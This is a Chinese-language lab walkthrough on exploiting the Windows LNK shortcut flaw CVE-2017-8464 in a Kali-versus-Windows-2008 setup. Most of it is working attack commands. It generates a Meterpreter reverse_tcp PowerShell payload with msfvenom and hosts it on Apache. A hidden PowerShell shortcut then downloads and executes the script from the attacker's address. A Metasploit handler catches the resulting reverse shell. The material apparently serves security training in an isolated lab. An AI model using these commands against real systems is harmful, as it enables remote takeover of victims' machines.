---
description: CVE-2017-8464
---

# Windows Link windows快捷方式漏洞

## 【原理】

Windows系统使用二进制解析 .LNK文件，当恶意二进制代码被系统识别执行时即可实现远程代码执行，由于是在explorer.exe进程中运行，所以 load 进内存时与当前用户具有相同权限。

攻击者利用这一解析过程将包含恶意二进制的代码被附带进可移动驱动器\(或远程共享过程中\)，受害者使用powershell解析 .LNK 文件后即被黑客所控制。

## 【工具】

* Metasploit
* Powershell

## 【步骤】

1.点击启动场景按钮，等待场景启动完成后，通过靶标接入协议进入漏洞标靶

攻击机：kali ip：192.168.166.13

目标靶机：win2008 ip:192.168.166.15

2.kali下生成一个反弹的 ps1的shell（使用root权限）:

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.166.13 lport=4444 -f psh-reflection>/opt/search.ps1
```

![image-20210220154841341](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220154841341.png)

3.切换到opt目录，然后查看到已生成了search.ps1 的powershell 后门

```text
cd /opt
ls
```

![image-20210220112219149](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220112219149.png)

4.将生成的search.ps1拷贝到/var/www/html目录下

```text
mv  search.ps1  /var/www/html
cd /var/www/html
ls
```

![image-20210220112647630](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220112647630.png)

5.启动apache服务

```text
service apache2 start
```

![image-20210220113510608](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220113510608.png)

6.访问web下的search.ps1，可以直接访问：[http://192.168.166.13/search.ps1](http://192.168.166.13/search.ps1)

```text
ip/search.ps1
```

![image-20210220114837168](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220114837168.png)

7.在靶机Windows2008上创建一个powershell远程快捷：

```text
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.166.13/search.ps1');test.ps1"
```

![image-20210220153556570](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220153556570.png)

输入以下代码：

```text
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.166.13/search.ps1');test.ps1"
```

![image-20210220155122710](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220155122710.png)

8.名称为:powershell.exe

![image-20210220153733262](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220153733262.png)

9.kali下创建监听反弹，并且可以看到成功反弹出靶机的shell:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST 192.168.166.13
set lport 4444
exploit
```

10.反弹shell，拿到权限

![image-20210220155410973](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220155410973.png)

![image-20210220155558190](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210220155558190.png)

